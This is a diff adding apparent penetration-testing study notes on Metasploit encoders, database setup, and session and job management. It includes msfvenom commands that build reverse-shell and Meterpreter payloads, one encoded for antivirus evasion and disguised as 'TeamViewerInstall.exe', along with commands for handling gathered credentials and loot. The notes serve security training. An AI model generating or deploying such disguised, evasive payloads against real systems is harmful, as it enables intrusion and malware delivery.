@@ -450,4 +450,351 @@ msf6 > grep meterpreter grep reverse_tcp show payloads
 Explore more advanced payloads such as Empire and Cobalt Strike for professional assessments.
 
 
+# Encoders in Metasploit
 
+Over the 15 years of existence of the Metasploit Framework, Encoders have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. Encoders come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:
+
+- **x64**
+- **x86**
+- **sparc**
+- **ppc**
+- **mips**
+
+They are also needed to remove hexadecimal opcodes known as bad characters from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.
+
+### Shikata Ga Nai Encoding
+
+Shikata Ga Nai (SGN) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (仕方がない) means _It cannot be helped_ or _Nothing can be done about it_, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. 
+
+### Selecting an Encoder
+
+Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the `msfconsole` script and were called **msfpayload** and **msfencode**.
+
+If we wanted to create our custom payload, we could do so through `msfpayload`, but we would have to encode it according to the target OS architecture using `msfencode` afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.
+
+#### Example:
+```bash
+msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
+```
+
+After 2015, updates to these scripts combined them into the `msfvenom` tool, which handles payload generation and encoding.
+
+#### Generating Payload - Without Encoding
+```bash
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
+```
+
+#### Generating Payload - With Encoding
+```bash
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+```
+
+### Using `msfvenom` with Multiple Encoders
+
+One better option would be to try running the payload through multiple iterations of the same Encoding scheme:
+
+```bash
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o TeamViewerInstall.exe
+```
+
+The `-i` flag specifies the number of iterations. However, this does not guarantee evasion against modern AV systems.
+
+### Compatible Encoders
+
+To check which encoders are compatible with a specific exploit or payload, use the `show encoders` command in `msfconsole`.
+
+#### Example:
+```bash
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
+```
+
+This command displays a list of compatible encoders for the selected module.
+
+---
+
+Encoders in Metasploit are useful for compatibility and some evasion scenarios, but modern AV systems have improved their detection capabilities. For advanced evasion techniques, alternative tools and methods are required.
+
+
+
+# Databases in Metasploit Framework
+
+Databases in `msfconsole` are used to keep track of your results. During complex assessments of machines or entire networks, managing results, entry points, detected issues, discovered credentials, etc., can become overwhelming. Databases help to organize and manage this data efficiently.
+
+Metasploit Framework supports the PostgreSQL database system, enabling quick access to scan results and seamless import/export capabilities with third-party tools.
+
+---
+
+## Setting up the Database
+
+1. **Check PostgreSQL Status**  
+   Ensure the PostgreSQL server is running on the host machine:
+
+   ```bash
+   sudo service postgresql status
+   ```
+
+2. **Start PostgreSQL**  
+   ```bash
+   sudo systemctl start postgresql
+   ```
+
+3. **Initialize the Database**  
+   Run the following to set up the MSF database:
+   ```bash
+   sudo msfdb init
+   ```
+
+4. **Verify Database Status**  
+   ```bash
+   sudo msfdb status
+   ```
+
+5. **Connect the Database to Metasploit**  
+   ```bash
+   sudo msfdb run
+   ```
+
+6. **Reinitialize Database (if needed)**  
+   Use these commands if reinitialization is required:
+   ```bash
+   msfdb reinit
+   cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+   sudo service postgresql restart
+   msfconsole -q
+   ```
+
+---
+
+## Database Commands in `msfconsole`
+
+To interact with the database, `msfconsole` offers integrated commands. Use `help database` for an overview.
+
+### Common Commands
+| Command             | Description                                         |
+|---------------------|-----------------------------------------------------|
+| `db_connect`        | Connect to an existing database                     |
+| `db_disconnect`     | Disconnect from the current database instance       |
+| `db_export`         | Export database contents                            |
+| `db_import`         | Import scan result files                            |
+| `db_nmap`           | Execute `nmap` and record results                   |
+| `db_status`         | Show database connection status                     |
+| `hosts`             | List all hosts in the database                      |
+| `services`          | List all services in the database                   |
+| `vulns`             | List vulnerabilities                               |
+| `workspace`         | Manage workspaces                                  |
+
+---
+
+## Workspaces
+
+Workspaces organize database entries into isolated sections based on criteria such as IP range, subnet, or domain.
+
+### Managing Workspaces
+- **List Workspaces**  
+  ```bash
+  workspace
+  ```
+- **Create Workspace**  
+  ```bash
+  workspace -a <workspace_name>
+  ```
+- **Switch Workspace**  
+  ```bash
+  workspace <workspace_name>
+  ```
+- **Delete Workspace**  
+  ```bash
+  workspace -d <workspace_name>
+  ```
+
+---
+
+## Importing Scan Results
+
+Import results from tools like Nmap into the database to enrich your workspace:
+
+1. Save the scan as an XML file:
+   ```bash
+   nmap -oX <filename>.xml <target>
+   ```
+
+2. Import the scan results:
+   ```bash
+   db_import <filename>.xml
+   ```
+
+3. Verify imported results using:
+   ```bash
+   hosts
+   services
+   ```
+
+---
+
+## Running Nmap from `msfconsole`
+
+Run Nmap directly in Metasploit using the `db_nmap` command. Example:
+
+```bash
+db_nmap -sV -sS <target>
+```
+
+---
+
+## Data Backup
+
+Export the database contents for backup using:
+```bash
+db_export -f xml <filename>.xml
+```
+
+---
+
+## Additional Commands
+
+### Hosts
+Displays host information stored in the database:
+```bash
+hosts -h
+```
+
+### Services
+Displays service information related to hosts:
+```bash
+services -h
+```
+
+### Credentials
+Manage gathered credentials:
+```bash
+creds -h
+```
+
+### Loot
+Displays or manages gathered loot (e.g., hash dumps):
+```bash
+loot -h
+```
+
+---
+
+## Conclusion
+
+The database functionality in Metasploit simplifies organizing and managing information during penetration tests. With features like workspaces, scan imports, and credentials management, it streamlines the assessment process while ensuring data remains accessible and well-organized.
+
+
+# Sessions in Metasploit
+
+MSFconsole can manage multiple modules simultaneously. This provides flexibility by allowing the user to run and manage various exploits and auxiliary modules concurrently using **Sessions**. Each session creates a dedicated control interface for the deployed modules, enabling seamless interaction.
+
+## Managing Sessions
+
+### Backgrounding Sessions
+While running exploits or auxiliary modules, sessions can be backgrounded. This allows the user to keep the connection with the target host active while launching new modules.
+
+- Use **`[CTRL] + [Z]`** or type the `background` command to background a session.
+- Backgrounding a session brings you back to the `msfconsole` prompt while maintaining the communication channel.
+
+### Listing Active Sessions
+The `sessions` command displays the list of all active sessions.
+
+```bash
+msf6 exploit(windows/smb/psexec_psh) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                 Connection
+  --  ----  ----                     -----------                 ----------
+  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
+```
+
+### Interacting with a Session
+Use `sessions -i [no.]` to interact with a specific session.
+
+```bash
+msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter >
+```
+
+This allows additional modules to be run on an already exploited system with a stable communication channel.
+
+### Switching Between Sessions
+You can background one session and interact with another by specifying the session ID.
+
+---
+
+## Jobs in Metasploit
+
+### Backgrounding Exploits as Jobs
+When running exploits, you can run them as background jobs to keep them active without blocking the console. Use the `exploit -j` command to run an exploit as a job.
+
+```bash
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.10.14.34:4444
+```
+
+### Listing and Managing Jobs
+- Use `jobs -l` to list all running jobs.
+- Use `jobs -k [index no.]` to kill a specific job.
+- Use `jobs -K` to terminate all running jobs.
+
+```bash
+msf6 exploit(multi/handler) > jobs -l
+
+Jobs
+====
+
+ Id  Name                    Payload                    Payload opts
+ --  ----                    -------                    ------------
+ 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
+```
+
+### Help Menu for Jobs
+The `jobs -h` command displays the help menu for job management.
+
+```bash
+msf6 exploit(multi/handler) > jobs -h
+Usage: jobs [options]
+
+Active job manipulation and interaction.
+
+OPTIONS:
+
+    -K        Terminate all running jobs.
+    -l        List all running jobs.
+    -k <opt>  Terminate jobs by job ID and/or range.
+    -h        Help banner.
+    -v        Print more detailed info. Use with -i and -l.
+```
+
+---
+
+## Additional Commands
+
+### Running Post-Exploitation Modules
+Post-exploitation modules can be run on an active session. After backgrounding a session, use `show options` within the selected module to link it to the session by specifying the session ID.
+
+### Viewing Exploit Help Menu
+To learn more about exploit options, use `exploit -h`.
+
+```bash
+msf6 exploit(multi/handler) > exploit -h
+Usage: exploit [options]
+
+OPTIONS:
+
+    -j        Run in the context of a job.
+    -e <opt>  Specify payload encoder.
+    -f        Force exploit to run.
+    -h        Help banner.
+```
+
+---
+
+With sessions and jobs, Metasploit provides efficient management tools for running and switching between multiple tasks and exploits during an assessment. This flexibility is invaluable for larger-scale penetration tests or complex engagements.
